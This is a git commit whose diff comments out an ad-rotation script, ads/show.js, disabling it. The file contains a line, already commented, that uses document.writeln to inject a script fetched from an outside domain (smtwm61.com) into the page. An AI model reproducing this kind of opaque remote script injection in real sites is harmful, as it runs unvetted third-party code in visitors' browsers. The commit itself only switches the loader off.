62caaf6440e9e2503613af7c1092de50cf3e2007
wztz <longfeinet@gmail.com>
2022-11-26 10:32:20 +0800

    1
    1

--- ads/show.js
+++ ads/show.js
@@ -1,3 +1,5 @@
+/*
+
 var m = 2; 
 var n = Math.floor(Math.random() * m + 1)
 switch (n) {
@@ -14,3 +16,5 @@ switch (n) {
 		//document.writeln("<script src=\'https://smtwm61.com/yd.php?id=440\'></script>");
 		break;
 }
+
+*/
